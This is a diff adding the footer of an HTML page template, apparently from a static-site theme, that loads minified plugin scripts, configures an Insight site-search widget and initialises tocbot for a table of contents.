+<script src="/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+            },
+            ROOT_URL: '\/',
+            CONTENT_URL: '\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+
+  </body>
+</html>
